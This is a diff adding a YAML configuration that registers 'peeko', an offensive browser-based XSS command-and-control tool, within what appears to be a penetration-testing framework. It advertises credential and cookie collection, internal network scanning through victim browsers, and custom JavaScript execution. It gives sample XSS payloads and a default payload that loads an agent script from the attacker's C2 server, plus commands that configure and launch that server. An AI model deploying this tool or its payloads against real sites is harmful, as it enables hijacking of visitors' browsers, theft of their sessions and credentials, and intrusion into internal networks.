@@ -1,0 +1,55 @@
+name: "peeko"
+description: |
+  Browser-based XSS C2 tool that turns compromised browsers into internal network proxies.
+
+  Features:
+    - WebSocket-based C2 communication
+    - Internal network scanning through victim browsers
+    - Cross-origin request automation
+    - Credential/cookie collection
+    - File delivery system
+    - Custom JavaScript execution
+  
+  Usage:
+    peeko -u <target_url> [--inject <payload>]
+  
+  Examples:
+    1. Basic injection:
+       peeko -u https://vulnerable.site/xss?param=<script>
+    
+    2. With custom payload:
+       peeko -u https://target.com -i "<svg/onload=import()>"
+  
+  Security Notes:
+    - Requires initial XSS vector
+    - HTTPS recommended for WebSocket transport
+    - Self-signed certs supported via gen-cert.sh
+
+author: "b3rito @ mes3hacklab"
+version: "v1.1"
+enabled: true
+params:
+  - name: "url"
+    type: string
+    required: true
+    description: "Initial XSS injection point URL"
+  
+  - name: "payload"
+    type: string
+    required: false
+    default: "<script src='{server}/static/agent.js'></script>"
+    description: "Custom XSS payload (uses {server} placeholder)"
+
+  - name: "rhost"
+    type: string
+    required: true
+    description: "IP/Domain of C2 server (e.g., 192.168.1.100)"
+
+tool:
+  name: "peeko"
+  repo_url: "https://github.com/b3rito/peeko.git"
+  install_path: "external/.exploit/peeko"
+  install_command: "make install && make cert"
+  execute_command: |
+    sed -i 's/SERVER-IP/{rhost}/g' static/agent.js static/control.html &&
+    python3 main.py --host 0.0.0.0 --port 8443
